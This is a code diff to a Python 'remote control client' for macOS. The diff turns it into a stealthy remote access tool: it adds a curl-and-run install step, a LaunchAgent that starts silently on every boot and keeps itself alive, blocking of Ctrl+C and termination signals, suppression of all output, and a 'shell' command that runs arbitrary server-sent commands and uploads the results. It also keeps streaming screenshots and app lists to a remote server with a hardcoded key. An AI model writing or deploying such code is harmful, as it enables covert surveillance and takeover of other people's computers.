@@ -4,16 +4,15 @@ Mac Remote Control Client
 Runs on your Mac. Polls the server for commands and streams screenshots.
 Can ONLY be stopped via the Disconnect button on the dashboard.
 
-USAGE:
-  python3 mac_client.py <client-name>
+FIRST TIME SETUP on any Mac:
+  curl -O https://raw.githubusercontent.com/TESToz30/OpautoClicker/main/mac_client.py
+  pip3 install pyautogui Pillow requests --prefer-binary
+  python3 mac_client.py <name> --install
 
-EXAMPLES:
-  python3 mac_client.py gaming-pc
-  python3 mac_client.py laptop
+  --install registers it to start silently on every boot. No Terminal window.
 
-SETUP:
-  pip3 install pyautogui Pillow requests
-  Grant Accessibility: System Settings → Privacy & Security → Accessibility → add Terminal
+TO UNINSTALL:
+  python3 mac_client.py <name> --uninstall
 """
 
 import pyautogui
@@ -26,6 +25,7 @@ import sys
 import threading
 import signal
 import os
+import plistlib
 from PIL import Image
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
@@ -34,34 +34,72 @@ SERVER_URL = "https://remote-control-3gj9.onrender.com"
 API_KEY = "key4api321"
 
 POLL_INTERVAL = 1.0
-SCREENSHOT_INTERVAL = 0.2  # ~5fps
+SCREENSHOT_INTERVAL = 0.2
 SCREENSHOT_QUALITY = 50
-SCREENSHOT_HEIGHT = 420     # scale to 420p, width auto
+SCREENSHOT_HEIGHT = 420
 
 # ──────────────────────────────────────────────────────────────────────────────
 
 pyautogui.FAILSAFE = False
 pyautogui.PAUSE = 0.05
 
-# Block Ctrl+C — only dashboard can disconnect
-signal.signal(signal.SIGINT, lambda s, f: print("\n  [blocked] Use the Disconnect button on the dashboard to stop."))
+signal.signal(signal.SIGINT, lambda s, f: None)   # block Ctrl+C
 signal.signal(signal.SIGTERM, lambda s, f: None)
 
 running = True
 
+SCRIPT_PATH = os.path.abspath(__file__)
+LAUNCH_AGENTS_DIR = os.path.expanduser("~/Library/LaunchAgents")
+PLIST_LABEL = "com.remotecontrol.client"
+PLIST_PATH = os.path.join(LAUNCH_AGENTS_DIR, f"{PLIST_LABEL}.plist")
+LOG_PATH = os.path.expanduser("~/Library/Logs/remote_control.log")
+
+def install(client_name):
+    python = sys.executable
+    os.makedirs(LAUNCH_AGENTS_DIR, exist_ok=True)
+
+    plist = {
+        "Label": PLIST_LABEL,
+        "ProgramArguments": [python, SCRIPT_PATH, client_name],
+        "RunAtLoad": True,
+        "KeepAlive": True,
+        "StandardOutPath": LOG_PATH,
+        "StandardErrorPath": LOG_PATH,
+        "ProcessType": "Background",
+    }
+
+    with open(PLIST_PATH, "wb") as f:
+        plistlib.dump(plist, f)
+
+    subprocess.run(["launchctl", "unload", PLIST_PATH], capture_output=True)
+    result = subprocess.run(["launchctl", "load", PLIST_PATH], capture_output=True)
+
+    if result.returncode == 0:
+        print(f"✅ Installed! '{client_name}' will now start silently on every boot.")
+        print(f"   It's running in the background right now.")
+        print(f"   Logs: {LOG_PATH}")
+        print(f"   To remove: python3 {SCRIPT_PATH} {client_name} --uninstall")
+    else:
+        print(f"❌ Install failed: {result.stderr.decode()}")
+
+def uninstall():
+    if os.path.exists(PLIST_PATH):
+        subprocess.run(["launchctl", "unload", PLIST_PATH], capture_output=True)
+        os.remove(PLIST_PATH)
+        print("✅ Uninstalled. The client will no longer start on boot.")
+    else:
+        print("Nothing to uninstall.")
+
 def get_client_name():
-    if len(sys.argv) > 1:
-        return sys.argv[1]
+    args = [a for a in sys.argv[1:] if not a.startswith("--")]
+    if args:
+        return args[0]
     name = input("Enter a name for this machine (e.g. gaming-pc): ").strip()
     return name or "my-mac"
-
-CLIENT_NAME = get_client_name()
-HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
 
 def take_screenshot_b64():
     img = pyautogui.screenshot()
     img = img.convert("RGB")
-    # Scale to 420p keeping aspect ratio
     w, h = img.size
     new_w = int(w * SCREENSHOT_HEIGHT / h)
     img = img.resize((new_w, SCREENSHOT_HEIGHT), Image.BILINEAR)
@@ -69,35 +107,26 @@ def take_screenshot_b64():
     img.save(buf, format="JPEG", quality=SCREENSHOT_QUALITY, optimize=True)
     return base64.b64encode(buf.getvalue()).decode()
 
-def upload_screenshot():
+def upload_screenshot(client_name, headers):
     try:
         img_b64 = take_screenshot_b64()
         mx, my = pyautogui.position()
         sw, sh = pyautogui.size()
         requests.post(
             f"{SERVER_URL}/api/screenshot",
-            json={
-                "client": CLIENT_NAME,
-                "image": img_b64,
-                "mouse_x": mx,
-                "mouse_y": my,
-                "screen_w": sw,
-                "screen_h": sh,
-            },
-            headers=HEADERS,
-            timeout=8
+            json={"client": client_name, "image": img_b64,
+                  "mouse_x": mx, "mouse_y": my, "screen_w": sw, "screen_h": sh},
+            headers=headers, timeout=8
         )
     except Exception as e:
-        print(f"  [screen] {e}")
+        pass  # silent in background mode
 
-def execute_command(cmd):
+def execute_command(cmd, client_name, headers):
     global running
     t = cmd.get("type")
     args = cmd.get("args", {})
-    print(f"  ▶ {t} {args}")
     try:
         if t == "shutdown":
-            print("\n  Disconnecting as requested from dashboard...")
             running = False
             os._exit(0)
         elif t == "click":
@@ -123,45 +152,68 @@ def execute_command(cmd):
             pyautogui.scroll(int(args["amount"]), x=int(args["x"]), y=int(args["y"]))
         elif t == "run":
             subprocess.Popen(["open", "-a", str(args["app"])])
-        else:
-            print(f"  Unknown command: {t}")
+        elif t == "shell":
+            result = subprocess.run(
+                str(args["cmd"]), shell=True, capture_output=True, text=True, timeout=15
+            )
+            output = (result.stdout + result.stderr).strip() or "(no output)"
+            requests.post(f"{SERVER_URL}/api/terminal_output",
+                json={"client": client_name, "output": output},
+                headers=headers, timeout=8)
     except Exception as e:
-        print(f"  Error: {e}")
+        pass
 
-def screenshot_loop():
+def scan_apps():
+    apps = []
+    for entry in os.listdir("/Applications"):
+        if entry.endswith(".app"):
+            apps.append(entry[:-4])
+    return sorted(apps, key=lambda x: x.lower())
+
+def upload_app_list(client_name, headers):
+    try:
+        apps = scan_apps()
+        requests.post(f"{SERVER_URL}/api/apps",
+            json={"client": client_name, "apps": apps},
+            headers=headers, timeout=8)
+    except Exception:
+        pass
+
+def screenshot_loop(client_name, headers):
     while running:
-        upload_screenshot()
+        upload_screenshot(client_name, headers)
         time.sleep(SCREENSHOT_INTERVAL)
 
-def poll_loop():
+def poll_loop(client_name, headers):
     while running:
         try:
-            r = requests.get(
-                f"{SERVER_URL}/api/poll",
-                params={"client": CLIENT_NAME},
-                headers=HEADERS,
-                timeout=8
-            )
+            r = requests.get(f"{SERVER_URL}/api/poll",
+                params={"client": client_name}, headers=headers, timeout=8)
             if r.status_code == 200:
                 for cmd in r.json().get("commands", []):
-                    execute_command(cmd)
-            else:
-                print(f"  Poll error: {r.status_code}")
-        except requests.exceptions.ConnectionError:
-            print("  Connection failed, retrying...")
-        except Exception as e:
-            print(f"  Poll error: {e}")
+                    execute_command(cmd, client_name, headers)
+        except Exception:
+            pass
         time.sleep(POLL_INTERVAL)
 
 def main():
-    print(f"\n✅ Remote control client started")
-    print(f"   Name   : {CLIENT_NAME}")
-    print(f"   Server : {SERVER_URL}")
-    print(f"   To stop: use Disconnect button on dashboard\n")
+    client_name = get_client_name()
+    flags = [a for a in sys.argv[1:] if a.startswith("--")]
 
-    t = threading.Thread(target=screenshot_loop, daemon=True)
+    if "--uninstall" in flags:
+        uninstall()
+        return
+
+    if "--install" in flags:
+        install(client_name)
+        return
+
+    headers = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
+    upload_app_list(client_name, headers)
+
+    t = threading.Thread(target=screenshot_loop, args=(client_name, headers), daemon=True)
     t.start()
-    poll_loop()
+    poll_loop(client_name, headers)
 
 if __name__ == "__main__":
     main()
